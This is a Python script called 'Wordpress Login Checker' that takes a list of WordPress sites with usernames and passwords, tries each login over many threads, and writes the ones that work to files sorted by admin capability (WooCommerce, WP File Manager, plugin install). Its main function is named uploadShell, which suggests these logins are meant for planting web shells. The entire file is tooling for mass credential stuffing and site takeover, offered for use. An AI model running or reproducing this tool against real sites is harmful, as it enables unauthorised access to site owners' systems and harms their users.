G = '\033[0;32m'
W = '\033[0;37m'
R = '\033[0;31m'
C = '\033[1;36m'

import requests
from bs4 import BeautifulSoup
from multiprocessing.dummy import Pool as ThreadPool

def uploadShell(site):
	asuna = site.replace('#', '|').replace('@', '|')
	try:
		site = asuna.split('|')[0]
		user = asuna.split('|')[1]
		pasw = asuna.split('|')[2]
		hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36'}
		r = requests.Session()
		cek = r.get(site, timeout=10)
		if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
			login = r.post(site, headers=hd, data={'log':user,'pwd':pasw}, timeout=10)
			if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.txt:
				print(' {}[{}+{}] {} --> {}Login Success!{}'.format(W,G,W,asuna,G,W))
				if 'WooCommerce' in login.text:
					print((' {}[{}+{}] WooCommerce!').format(W,G,W))
					assz = open('WooCommerce.txt', 'a')
					assz.write(site+'#'+user+'@'+pasw+'\n')
				if 'WP File Manager' in login.text:
					print((' {}[{}+{}] WP File Manager!').format(W,G,W))
					assz = open('wpfilemanager.txt', 'a')
					assz.write(site+'#'+user+'@'+pasw+'\n')
				if 'plugin-install.php' in login.text:
					print((' {}[{}+{}] Plugin install!').format(W,G,W))
					assz = open('plugin-install.txt', 'a')
					assz.write(site+'#'+user+'@'+pasw+'\n')
				else:
					pass
			else:
				pass
		else:
			pass
	except:
		print('\n {}[{}-{}] {} --> {}Failed!{}\n'.format(W,R,W,site,R,W))
		
print('''{}
        Wordpress Login Checker
        Author : angga1337{}
'''.format(C,W))

site = open(input('        Website: '),'r').read().splitlines()
Thread = int(input('        Thread: '))
pool = ThreadPool(Thread)
pool.map(uploadShell, site)
pool.close()
pool.join()
